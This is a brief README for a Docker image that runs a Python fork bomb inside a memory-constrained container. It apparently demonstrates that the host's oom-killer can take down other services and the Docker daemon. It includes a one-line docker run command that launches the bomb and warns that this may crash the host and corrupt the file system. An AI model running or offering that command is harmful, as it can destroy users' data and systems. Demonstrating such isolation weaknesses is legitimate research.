# docker-fork-bomb

Strange things happen, when you execute `docker run -it --rm --memory=128M --kernel-memory=16M lmmdock/fork-bomb`. Be aware that your complete system may crash, even your file system might get corrupted by this command.

It basically just executes a fork bomb in a resource (memory) constrained container.

## Syslog of exemplary run

Executing the image leads to arbitrary system services (such as other containers, user applications on the host or even the file system driver) to be killed. In the following example, the oom-killer didn't kill the our Python-based fork bomb. Instead the whole docker deamon was affected (see [shell output](#shell-output-of-exemplary-run) below).
